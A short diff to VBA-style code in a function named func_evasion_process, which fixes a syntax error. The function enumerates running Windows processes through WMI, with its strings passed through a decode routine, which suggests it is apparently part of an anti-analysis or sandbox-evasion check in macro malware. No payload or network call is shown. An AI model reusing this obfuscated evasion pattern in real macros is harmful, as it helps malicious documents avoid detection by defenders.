@@ -6,7 +6,7 @@ Function func_evasion_process() As String
 	Dim func_evasion_process1 As String
 	Dim func_evasion_process2 As Object
 	Dim func_evasion_process3 As Object
-	Dim func_evasion_process = "bool1"
+	func_evasion_process = "bool1"
 	
 	Set func_evasion_process2 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
 	Set func_evasion_process3 = func_evasion_process2.ExecQuery(decode("{[SELECT Name FROM Win32_Process]}"))
